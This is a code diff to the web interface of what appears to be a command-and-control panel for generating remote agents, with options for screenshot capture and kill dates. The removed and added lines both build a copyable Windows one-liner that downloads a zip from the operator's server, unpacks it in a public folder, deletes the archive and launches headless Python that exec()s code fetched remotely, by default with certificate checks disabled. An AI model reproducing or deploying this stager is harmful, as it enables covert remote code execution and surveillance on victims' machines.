@@ -125,6 +125,14 @@
                             </div>
                         </div>
                     </div>
+                    <div class="row mb-3">
+                        <div class="col-md-6">
+                            <div class="form-check">
+                                <input class="form-check-input" type="checkbox" id="trustedCertificate">
+                                <label class="form-check-label" for="trustedCertificate">Trusted Certificate</label>
+                            </div>
+                        </div>
+                    </div>
                     <div class="d-grid gap-2">
                         <button type="submit" class="btn btn-primary">Generate Agent</button>
                     </div>
@@ -172,6 +180,7 @@
         </div>
     </div>
 </div>
+
 
 <script>
     // Initialize Socket.IO connection
@@ -287,106 +296,6 @@
         }
     });
 
-    // Agent deployment functionality
-    document.addEventListener('DOMContentLoaded', function() {
-        const form = document.getElementById('agentConfigForm');
-        const downloadDiv = document.getElementById('agentDownload');
-        const downloadLink = document.getElementById('downloadLink');
-        const errorDiv = document.getElementById('agentError');
-        const enableKillDate = document.getElementById('enableKillDate');
-        const killDateInput = document.getElementById('killDate');
-
-        // Toggle kill date input
-        enableKillDate.addEventListener('change', function() {
-            killDateInput.disabled = !this.checked;
-        });
-
-        // Form submission
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            errorDiv.style.display = 'none';
-            
-            const config = {
-                checkin_interval: document.getElementById('checkinInterval').value,
-                server_url: document.getElementById('serverUrl').value,
-                take_screenshots: document.getElementById('takeScreenshots').checked,
-                screenshot_frequency: document.getElementById('screenshotFrequency').value,
-                enable_killdate: enableKillDate.checked,
-                killdate: enableKillDate.checked ? killDateInput.value : null
-            };
-
-            try {
-                const response = await fetch('/api/generate_agent', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(config)
-                });
-
-                const data = await response.json();
-                
-                if (!response.ok) {
-                    throw new Error(data.message || 'Failed to generate agent');
-                }
-
-                // Update download link
-                downloadLink.href = `/a/d?t=${Date.now()}`;
-                
-                // Generate and display the command
-                generateCommand(config.server_url, config.enable_killdate, config.killdate);
-                
-                // Show download section
-                downloadDiv.style.display = 'block';
-                
-            } catch (error) {
-                console.error('Error:', error);
-                errorDiv.textContent = error.message;
-                errorDiv.style.display = 'block';
-            }
-        });
-
-        // Generate the command to display
-        function generateCommand(url, enableKillDate, killDate) {
-            // Format kill date for display if enabled
-            let killDateDisplay = '';
-            if (enableKillDate && killDate) {
-                const dateObj = new Date(killDate);
-                const formattedDate = dateObj.toISOString().replace('T', ' ').substring(0, 16);
-                killDateDisplay = `\n<span style="color: #569cd6;"># Kill Date:</span> <span style="color: #ce9178;">${formattedDate}</span>`;
-            }
-
-            // Create the command
-            const command = `curl -ks ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c "import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
-            
-            // Display it with syntax highlighting and kill date info
-            document.getElementById('displayArea').innerHTML = `
-                <code style="color: #9cdcfe;">curl</code> <code style="color: #ce9178;">-ks</code> <code style="color: #ce9178;">${url}/a/p</code> <code style="color: #ce9178;">-o</code> <code style="color: #ce9178;">c:\\users\\public\\p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">c:\\users\\public</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">tar</code> <code style="color: #ce9178;">-xf</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">del</code> <code style="color: #ce9178;">/q</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">documents</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">"<span style="color: #569cd6;">import</span> urllib3;urllib3.<span style="color: #dcdcaa;">disable_warnings</span>(urllib3.exceptions.InsecureRequestWarning);<span style="color: #569cd6;">import</span> requests;url='${url}/a/d';<span style="color: #569cd6;">exec</span>(requests.<span style="color: #dcdcaa;">get</span>(url,verify=<span style="color: #569cd6;">False</span>).text)"</code>
-                ${killDateDisplay}
-                <button id="copyButton" class="btn btn-sm btn-secondary" style="
-                    position: absolute;
-                    top: 5px;
-                    right: 5px;
-                    padding: 2px 8px;
-                    font-size: 12px;
-                    opacity: 0.8;
-                ">
-                    <i class="bi bi-clipboard"></i> Copy
-                </button>`;
-            
-            // Add copy functionality
-            document.getElementById('copyButton').addEventListener('click', function() {
-                navigator.clipboard.writeText(command).then(function() {
-                    const originalText = this.innerHTML;
-                    this.innerHTML = '<i class="bi bi-check"></i> Copied!';
-                    setTimeout(() => {
-                        this.innerHTML = originalText;
-                    }, 2000);
-                }.bind(this));
-            });
-        }
-    });
-
     // Toast notification system
     function showToast(title, message, type, html = false) {
         const toastContainer = document.getElementById('toastContainer') || createToastContainer();
@@ -455,12 +364,140 @@
         refreshAgentList();
     });
 
-    // Initialize tooltips
+    // Initialize tooltips and agent deployment functionality
     document.addEventListener('DOMContentLoaded', function() {
+        // Initialize tooltips
         const tooltipTriggerList = [].slice.call(document.querySelectorAll('[title]'));
         tooltipTriggerList.map(function(tooltipTriggerEl) {
             return new bootstrap.Tooltip(tooltipTriggerEl);
         });
+
+        // Agent deployment functionality
+        const form = document.getElementById('agentConfigForm');
+        const downloadDiv = document.getElementById('agentDownload');
+        const downloadLink = document.getElementById('downloadLink');
+        const errorDiv = document.getElementById('agentError');
+        const enableKillDate = document.getElementById('enableKillDate');
+        const killDateInput = document.getElementById('killDate');
+        const trustedCertificate = document.getElementById('trustedCertificate');
+
+        // Toggle kill date input
+        enableKillDate.addEventListener('change', function() {
+            killDateInput.disabled = !this.checked;
+        });
+
+        // Form submission - prevent default and handle manually
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            errorDiv.style.display = 'none';
+            
+            const config = {
+                checkin_interval: document.getElementById('checkinInterval').value,
+                server_url: document.getElementById('serverUrl').value,
+                take_screenshots: document.getElementById('takeScreenshots').checked,
+                screenshot_frequency: document.getElementById('screenshotFrequency').value,
+                enable_killdate: enableKillDate.checked,
+                killdate: enableKillDate.checked ? killDateInput.value : null,
+                trusted_certificate: trustedCertificate.checked
+            };
+
+            try {
+                const response = await fetch('/api/generate_agent', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(config)
+                });
+
+                const data = await response.json();
+                
+                if (!response.ok) {
+                    throw new Error(data.message || 'Failed to generate agent');
+                }
+
+                // Update download link with cache-busting timestamp
+                downloadLink.href = `/a/d?t=${Date.now()}`;
+                
+                // Generate and display the command
+                generateCommand(config.server_url, config.enable_killdate, config.killdate, config.trusted_certificate);
+                
+                // Show download section
+                downloadDiv.style.display = 'block';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                errorDiv.textContent = error.message;
+                errorDiv.style.display = 'block';
+            }
+        });
+
+        // Trusted certificate checkbox change handler
+        trustedCertificate.addEventListener('change', function() {
+            // Only update if download section is visible
+            if (downloadDiv.style.display === 'block') {
+                const url = document.getElementById('serverUrl').value;
+                const enableKillDate = document.getElementById('enableKillDate').checked;
+                const killDate = document.getElementById('killDate').value;
+                generateCommand(url, enableKillDate, killDate, this.checked);
+            }
+        });
+
+        // Generate command function
+        function generateCommand(url, enableKillDate, killDate, trustedCert) {
+            // Format kill date for display if enabled
+            let killDateDisplay = '';
+            if (enableKillDate && killDate) {
+                const dateObj = new Date(killDate);
+                const formattedDate = dateObj.toISOString().replace('T', ' ').substring(0, 16);
+                killDateDisplay = `\n<span style="color: #569cd6;"># Kill Date:</span> <span style="color: #ce9178;">${formattedDate}</span>`;
+            }
+
+            // Create the command based on trusted certificate setting
+            let command;
+            const curlOption = trustedCert ? '-s' : '-ks';
+            const pythonCode = trustedCert ? 
+                `"import urllib3;import requests;url='${url}/a/d';exec(requests.get(url).text)"` :
+                `"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
+            
+            command = `curl ${curlOption} ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c ${pythonCode}`;
+
+            // Display with syntax highlighting
+            document.getElementById('displayArea').innerHTML = `
+                <code style="color: #9cdcfe;">curl</code> <code style="color: #ce9178;">${curlOption}</code> <code style="color: #ce9178;">${url}/a/p</code> <code style="color: #ce9178;">-o</code> <code style="color: #ce9178;">c:\\users\\public\\p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">c:\\users\\public</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">tar</code> <code style="color: #ce9178;">-xf</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">del</code> <code style="color: #ce9178;">/q</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">documents</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">${formatPythonCode(pythonCode)}
+                ${killDateDisplay}
+                <button id="copyButton" class="btn btn-sm btn-secondary" style="
+                    position: absolute;
+                    top: 5px;
+                    right: 5px;
+                    padding: 2px 8px;
+                    font-size: 12px;
+                    opacity: 0.8;
+                ">
+                    <i class="bi bi-clipboard"></i> Copy
+                </button>`;
+            
+            // Add copy functionality
+            document.getElementById('copyButton').addEventListener('click', function() {
+                navigator.clipboard.writeText(command).then(function() {
+                    const originalText = this.innerHTML;
+                    this.innerHTML = '<i class="bi bi-check"></i> Copied!';
+                    setTimeout(() => {
+                        this.innerHTML = originalText;
+                    }, 2000);
+                }.bind(this));
+            });
+        }
+
+        // Helper function to format Python code with syntax highlighting
+        function formatPythonCode(code) {
+            return code
+                .replace(/import/g, '<span style="color: #569cd6;">import</span>')
+                .replace(/exec/g, '<span style="color: #569cd6;">exec</span>')
+                .replace(/False/g, '<span style="color: #569cd6;">False</span>')
+                .replace(/disable_warnings/g, '<span style="color: #dcdcaa;">disable_warnings</span>')
+                .replace(/get/g, '<span style="color: #dcdcaa;">get</span>');
+        }
     });
 </script>
 
